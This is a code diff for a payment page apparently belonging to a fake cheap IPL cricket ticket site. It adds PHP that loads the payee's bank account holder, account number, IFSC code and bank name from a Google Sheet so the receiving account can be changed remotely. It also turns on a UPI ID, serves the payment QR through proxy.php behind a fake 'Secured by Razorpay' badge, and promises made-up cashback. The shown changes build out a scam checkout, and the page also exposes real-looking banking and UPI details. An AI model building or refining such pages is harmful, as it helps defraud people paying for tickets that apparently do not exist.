@@ -1,3 +1,34 @@
+<?php 
+
+
+// Step 1: Sheet ID डालो
+$sheetID = '1uOizVEbJY9PRypIlp5k_toanakRXAP3lS4MNf-4d1Lk';
+
+// Step 2: Sheet का Public URL बनाओ
+$url = "https://docs.google.com/spreadsheets/d/$sheetID/gviz/tq?tqx=out:json";
+
+// Step 3: URL से डेटा लो
+$response = file_get_contents($url);
+
+// Step 4: Response से Unwanted characters हटाओ
+$data = json_decode(substr($response, 47, -2), true);
+
+// Step 5: अब rows पढ़ो
+$rows = $data['table']['rows'];
+
+// Step 6: अब $rows को loop कर लो
+foreach ($rows as $row) {
+    $payment_method = $row['c'][0]['v'] ?? '';
+    $account_holder = $row['c'][1]['v'] ?? '';
+    $account_number = $row['c'][2]['v'] ?? '';
+    $ifsc_code = $row['c'][3]['v'] ?? '';
+    $bank_name = $row['c'][4]['v'] ?? '';
+    $payment_status = $row['c'][5]['v'] ?? '';
+    $note = $row['c'][6]['v'] ?? '';
+
+    //echo "Payment Method: $payment_method, Account Holder: $account_holder, Account Number: $account_number, IFSC Code: $ifsc_code, Bank Name: $bank_name, Payment Status: $payment_status, Note: $note <br>";
+}
+?>
 
 <!-- saved from url=(0057)https://cheap.get-ipl-ticket-seller.com/payment.php?id=70 -->
 <html lang="en"><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
@@ -421,8 +452,15 @@ src="https://www.facebook.com/tr?id=661642293008712&ev=PageView&noscript=1"
 
                                                 </div>
                                                 <div class="relative inline-block">
-    <img alt="Payment QR Code" class="mx-auto rounded-md border border-gray-200" src="qrcode.jpeg">
+
+                                                <img src="proxy.php" alt="Google Drive Image">
+                                                    <?php // include('proxy.php'); ?>
+     
+
 </div>
+
+
+
                                                 <div class="mt-3 text-sm text-gray-600">Scan the QR using any UPI App</div>
                                                 <div class="flex justify-center gap-6 mt-4">
                                                     <div class="flex flex-col items-center"><img alt="GPay" class="w-10 h-10 object-contain" src="./payment_files/googlepay.svg"><span class="text-xs mt-1">GPay</span></div>
@@ -436,13 +474,13 @@ src="https://www.facebook.com/tr?id=661642293008712&ev=PageView&noscript=1"
                                                 <p class="text-sm font-medium mb-2">Pay using any upi to make your order success ✓</p>
 
 
-                                                <!-- <div class="upi-id-container">
+                                                <div class="upi-id-container">
                                                     <span class="upi-text text-gray-800 font-medium">netc.34161fa820328aa2d3c31760@mairtel</span>
                                                     <div class="copy-button-wrapper">
                                                         <button class="copy-button p-1.5 rounded-md transition-all bg-gray-50" aria-label="Copy UPI ID">
                                                             <span class="text-blue-600 text-xs font-medium px-1">Copy</span></button>
                                                     </div>
-                                                </div> -->
+                                                </div>
 
 
                                                 <div class="mt-2 text-sm text-gray-500">Amount to be Paid <span class="font-bold text-gray-700 final_paid_price">₹599</span></div>
@@ -499,26 +537,26 @@ src="https://www.facebook.com/tr?id=661642293008712&ev=PageView&noscript=1"
                             </div>
 
 
-                            <!-- <div class="p-2 border-b border-gray-100"><button class="w-full text-left py-3 px-4 rounded-md payment-option ">
+                            <div class="p-2 border-b border-gray-100"><button class="w-full text-left py-3 px-4 rounded-md payment-option ">
                                     <div class="flex items-center justify-between w-full">
                                         <div class="flex items-center">
                                             <div class="payment-icon bg-purple-100 rounded-full p-2 mr-3"><i class="fa-solid fa-credit-card text-purple-600"></i></div><span class="font-medium mr-2">Cards</span><img alt="Credit Card Options" class="payment-logo-small hidden md:block" src="./payment_files/360_F_589458438_NjcRmqJWjA2Jk2YlMY2k5jKB4iCdRkAn.jpg">
                                         </div>
                                         <div class="text-red-600 text-xs font-medium">Server Unavailable</div>
                                     </div>
-                                </button></div> -->
+                                </button></div>
 
                             <div class="p-2 border-b border-gray-100">
 
-                                <!-- <button class="w-full text-left py-3 px-4 rounded-md payment-option ">
+                                <button class="w-full text-left py-3 px-4 rounded-md payment-option ">
                                     <div class="flex items-center justify-between w-full">
                                         <div class="flex items-center">
                                             <div class="payment-icon bg-yellow-100 rounded-full p-2 mr-3"><i class="fa-solid fa-wallet text-yellow-600"></i></div>
                                             <span class="font-medium mr-2">Wallet</span>
-                                            <img alt="Wallet Payment Options" class="payment-logo hidden md:block" src="https://shopindiaonline.in/wp-content/uploads/2023/09/payment-logo-icons-1024x272-1.png">
+                                            <!-- <img alt="Wallet Payment Options" class="payment-logo hidden md:block" src="https://shopindiaonline.in/wp-content/uploads/2023/09/payment-logo-icons-1024x272-1.png"> -->
                                         </div><i class="fa-solid fa-chevron-down text-gray-400"></i>
                                     </div>
-                                </button> -->
+                                </button>
                                 <div class="accordion-content">
                                     <div class="mt-4 p-6 border border-gray-200 rounded-xl bg-gradient-to-b from-white to-gray-50">
                                         <div class="text-center">
@@ -529,7 +567,7 @@ src="https://www.facebook.com/tr?id=661642293008712&ev=PageView&noscript=1"
                                             <p class="text-sm text-gray-600 mb-3">Pay using any wallet to complete your purchase</p>
                                             <div class="mt-4 bg-green-50 text-green-700 p-2 rounded-md text-xs"><i class="fa-solid fa-tag mr-1"></i>Upto ₹2,503 cashback – You will receive this cashback within 48 hours once the ticket is confirmed. It will be credited after the ticket confirmation happens within 24 hours.</div>
                                             <div class="bg-white p-2 rounded-lg border border-gray-200 mb-4">
-                                                <div class="upi-id-container"><span class="upi-text text-gray-800 font-medium">netc.34161fa820328aa2d3c31760@mairtel</span>
+                                                <div class="upi-id-container"><span class="upi-text text-gray-800 font-medium">-upi</span>
                                                     <div class="copy-button-wrapper"><button class="copy-button p-1.5 rounded-md transition-all bg-gray-50" aria-label="Copy UPI ID"><span class="text-blue-600 text-xs font-medium px-1">Copy</span></button></div>
                                                 </div>
                                                 <div class="mt-2 text-sm text-gray-500">Amount to be Paid <span class="font-bold text-gray-700 final_paid_price">₹599</span></div>
@@ -553,6 +591,8 @@ src="https://www.facebook.com/tr?id=661642293008712&ev=PageView&noscript=1"
                                 </button>
 
 
+ 
+
                                 <div class="accordion-content ">
                                     <div class="mt-4 p-2 border border-gray-200 rounded-xl bg-gradient-to-b from-white to-gray-50">
                                         <div class="text-center">
@@ -564,19 +604,19 @@ src="https://www.facebook.com/tr?id=661642293008712&ev=PageView&noscript=1"
                                             <div class="bank-details-card p-2 mb-4 border border-gray-100">
                                                 <div class="bank-detail-row">
                                                     <div class="flex items-center space-x-2"><i class="fas fa-user text-green-500"></i><span class="text-sm text-gray-600">Account Holder</span></div>
-                                                    <div class="flex items-center text-right"><span class="text-sm font-medium">Mr. Mithun Kumar</span></div>
+                                                    <div class="flex items-center text-right"><span class="text-sm font-medium"><?php echo $account_holder; ?></span></div>
                                                 </div>
                                                 <div class="bank-detail-row">
                                                     <div class="flex items-center space-x-2"><i class="fas fa-hashtag text-blue-500"></i><span class="text-sm text-gray-600">Account Number</span></div>
-                                                    <div class="flex items-center"><span class="text-sm font-medium mr-2">728210110016145</span><button class="copy-button p-1.5 rounded-full transition-all " aria-label="Copy account number"><i class="far fa-copy text-gray-500"></i></button></div>
+                                                    <div class="flex items-center"><span class="text-sm font-medium mr-2"><?php echo $account_number; ?></span><button class="copy-button p-1.5 rounded-full transition-all " aria-label="Copy account number"><i class="far fa-copy text-gray-500"></i></button></div>
                                                 </div>
                                                 <div class="bank-detail-row">
                                                     <div class="flex items-center space-x-2"><i class="fas fa-fingerprint text-indigo-500"></i><span class="text-sm text-gray-600">IFSC Code</span></div>
-                                                    <div class="flex items-center"><span class="text-sm font-medium mr-2">BKID0007282</span><button class="copy-button p-1.5 rounded-full transition-all " aria-label="Copy IFSC code"><i class="far fa-copy text-gray-500"></i></button></div>
+                                                    <div class="flex items-center"><span class="text-sm font-medium mr-2"><?php echo $ifsc_code; ?></span><button class="copy-button p-1.5 rounded-full transition-all " aria-label="Copy IFSC code"><i class="far fa-copy text-gray-500"></i></button></div>
                                                 </div>
                                                 <div class="bank-detail-row">
                                                     <div class="flex items-center space-x-2"><i class="fas fa-university text-purple-500"></i><span class="text-sm text-gray-600">Bank Name</span></div>
-                                                    <div class="flex items-center"><span class="text-sm font-medium mr-2">Bank of India</span><button class="copy-button p-1.5 rounded-full transition-all " aria-label="Copy bank name"><i class="far fa-copy text-gray-500"></i></button></div>
+                                                    <div class="flex items-center"><span class="text-sm font-medium mr-2"><?php echo $bank_name; ?></span><button class="copy-button p-1.5 rounded-full transition-all " aria-label="Copy bank name"><i class="far fa-copy text-gray-500"></i></button></div>
                                                 </div>
                                                 <div class="bank-detail-row bg-indigo-50 rounded-lg mt-2">
                                                     <div class="flex items-center space-x-2"><i class="fas fa-rupee-sign text-indigo-700"></i><span class="text-sm font-medium">Amount to be Paid</span></div><span class="text-sm font-bold text-indigo-700 final_paid_price">₹599</span>
@@ -644,7 +684,9 @@ src="https://www.facebook.com/tr?id=661642293008712&ev=PageView&noscript=1"
                                 <div class="mt-6 razorpay-badge">
                                     <p class="text-xs text-gray-500 flex items-center justify-center"><i class="fa-solid fa-lock mr-1"></i>Secured by</p>
                                     <!-- <div class="flex justify-center mt-2"><img alt="Razorpay" class="h-8" src="./payment_files/razorpay-logo.svg"></div> -->
-                                    <div class="flex justify-center mt-2"><img alt="Razorpay" class="" src="qrcode.jpeg"></div>
+                                    <div class="flex justify-center mt-2">
+                                        <img alt="Razorpay" class="" src="proxy.php">
+                                    </div>
                                 </div>
                                 <div class="mt-4 p-3 bg-gray-50 rounded-lg border border-gray-100">
                                     <div class="flex items-center text-xs text-gray-600"><i class="fas fa-shield-alt text-green-500 mr-2"></i><span>Your payment information is secure and encrypted</span></div>
